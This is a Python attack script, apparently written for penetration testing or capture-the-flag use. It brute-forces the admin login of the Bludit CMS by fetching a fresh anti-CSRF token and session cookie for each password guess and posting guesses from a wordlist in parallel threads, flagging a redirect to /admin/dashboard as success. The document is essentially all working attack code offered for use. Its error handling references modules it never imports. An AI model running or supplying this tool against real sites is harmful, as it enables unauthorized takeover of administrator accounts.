import requests
import re
import argparse
import time
import threading

def parserss():
    parser = argparse.ArgumentParser(prog='csrfBruteforce.py',description='Anti-CSRF token Bruteforce')
    parser.add_argument("-u", "--url", dest="targeturl", help="Enter Login URL", required=True)
    parser.add_argument("-w", "--wordlist", dest="wordlist", help="EEnter wordlist")
    parser.add_argument("-k", "--user", dest="username", help="Enter Login URL", required=True)
    args = parser.parse_args()
    return args

def getCSRF(target_url):
    req= requests.get(target_url)
    data = str(req.content)
    fetchtoken = re.search('(?<=input type="hidden" id="jstokenCSRF" name="tokenCSRF" value=")[^."]*', data)
    token = fetchtoken.group(0)
    cookie = req.headers['Set-Cookie']

    return cookie,token

def attack(username, password, target_url, cooki, tok):
    try:
        
        cookievalue = re.search('(?<=BLUDIT-KEY=)[^;]*', cooki).group(0)
        headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0",
                "Referer": target_url}

        data = {'tokenCSRF': tok, 'username': username, 'password': password, 'save': ''}

        print("Hitting => {}:{} ".format(username,password))
        
        response = requests.post(target_url, data=data, headers=headers, cookies={"BLUDIT-KEY": cookievalue}, allow_redirects = False )
        #print(response.headers['location'])

    except (OSError, ConnectionResetError, TimeoutError, requests.exceptions.RequestException, urllib3.exceptions.ProtocolError,requests.exceptions.ConnectionError, http.client.RemoteDisconnected) as e:
        time.sleep(4)
        response = requests.post(target_url, data=data, headers=headers, cookies={"BLUDIT-KEY": cookievalue}, allow_redirects = False )

    if 'location' in response.headers:
        if '/admin/dashboard' in response.headers['location']:
            print("SUCCESSS!!!!!!!!!!!!   {}:{}".format(username,password))
        else:
            pass
    else:
        pass
    
    #if "BLUDIT-KEY=deleted" not in request.headers['Set-Cookie']:
     #   print("[+] Password found: {} !!!!!!!!".format(password))
    #if req.headers['Location'] != "/admin/login":
        #print("[+] Password found: {} !!!!!!!!".format(password))
    #else:
    #    pass


if __name__ == '__main__':

    options = parserss()
    target_url = options.targeturl
    wordlist = options.wordlist
    username = options.username

    with open(wordlist, "r") as list:
        passwords = list.readlines()
    
    for i in passwords:
        word = i.strip()
        cooki,tok = getCSRF(target_url) 
        process = threading.Thread(target=attack, args=(username, word, target_url, cooki, tok,))
        process.start()
        time.sleep(0.5)
        #attack(username, word, target_url)

    print("[!] Bruteforce Complete")

